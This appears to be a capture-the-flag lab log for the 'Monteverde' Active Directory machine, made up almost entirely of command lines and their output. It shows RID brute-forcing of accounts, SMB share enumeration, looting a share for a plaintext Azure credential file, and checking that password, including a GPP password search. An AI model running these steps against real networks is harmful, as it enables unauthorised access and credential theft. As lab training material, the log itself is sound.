
```sh
┌──(fixit42㉿kali)-[~]
└─$ nxc smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --rid-brute
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       498: MEGABANK\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       500: MEGABANK\Administrator (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       501: MEGABANK\Guest (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       502: MEGABANK\krbtgt (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       512: MEGABANK\Domain Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       513: MEGABANK\Domain Users (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       514: MEGABANK\Domain Guests (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       515: MEGABANK\Domain Computers (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       516: MEGABANK\Domain Controllers (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       517: MEGABANK\Cert Publishers (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       518: MEGABANK\Schema Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       519: MEGABANK\Enterprise Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       520: MEGABANK\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       521: MEGABANK\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       522: MEGABANK\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       525: MEGABANK\Protected Users (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       526: MEGABANK\Key Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       527: MEGABANK\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       553: MEGABANK\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       571: MEGABANK\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       572: MEGABANK\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       1000: MEGABANK\MONTEVERDE$ (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       1101: MEGABANK\DnsAdmins (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       1102: MEGABANK\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       1103: MEGABANK\SQLServer2005SQLBrowserUser$MONTEVERDE (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       1104: MEGABANK\AAD_987d7f2f57d2 (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       1105: MEGABANK\ADSyncAdmins (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       1106: MEGABANK\ADSyncOperators (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       1107: MEGABANK\ADSyncBrowse (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       1108: MEGABANK\ADSyncPasswordSet (SidTypeAlias)
SMB         10.129.228.111  445    MONTEVERDE       1601: MEGABANK\mhope (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       2601: MEGABANK\Azure Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2602: MEGABANK\SABatchJobs (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       2603: MEGABANK\svc-ata (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       2604: MEGABANK\svc-bexec (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       2605: MEGABANK\svc-netapp (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       2606: MEGABANK\File Server Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2607: MEGABANK\Call Recording Admins (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2608: MEGABANK\Reception (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2609: MEGABANK\Operations (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2610: MEGABANK\Trading (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2611: MEGABANK\HelpDesk (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2612: MEGABANK\Developers (SidTypeGroup)
SMB         10.129.228.111  445    MONTEVERDE       2613: MEGABANK\dgalanos (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       2614: MEGABANK\roleary (SidTypeUser)
SMB         10.129.228.111  445    MONTEVERDE       2615: MEGABANK\smorgan (SidTypeUser)
```

```sh
┌──(fixit42㉿kali)-[~]
└─$ nxc smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares   
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ 
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/montverde]
└─$ smbget --user='SABatchJobs' --password='SABatchJobs' --recursive smb://10.129.228.111/azure_uploads
Using domain: WORKGROUP, user: SABatchJobs
Downloaded 0b in 0 seconds
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/montverde]
└─$ smbget --user='SABatchJobs' --password='SABatchJobs' --recursive smb://10.129.228.111/users$
Using domain: WORKGROUP, user: SABatchJobs
Using domain: WORKGROUP, user: SABatchJobs
Using domain: WORKGROUP, user: SABatchJobs
Using domain: WORKGROUP, user: SABatchJobs
smb://10.129.228.111/users$/mhope/azure.xml                                                                                   
Using domain: WORKGROUP, user: SABatchJobs
Using domain: WORKGROUP, user: SABatchJobs
Downloaded 1.18kB in 1 seconds
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/montverde/mhope]
└─$ cat azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs> 
```

mhope:4n0therD4y@n0th3r$

confirm:
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/montverde/mhope]
└─$ nxc smb 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ            
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/montverde/mhope]
└─$ nxc smb 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$' -M gpp_password
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ            
GPP_PASS... 10.129.228.111  445    MONTEVERDE       [+] Found SYSVOL share
GPP_PASS... 10.129.228.111  445    MONTEVERDE       [*] Searching for potential XML files containing passwords
SMB         10.129.228.111  445    MONTEVERDE       [*] Started spidering
SMB         10.129.228.111  445    MONTEVERDE       [*] Spidering .
SMB         10.129.228.111  445    MONTEVERDE       [*] Done spidering (Completed in 1.9693090915679932)
```

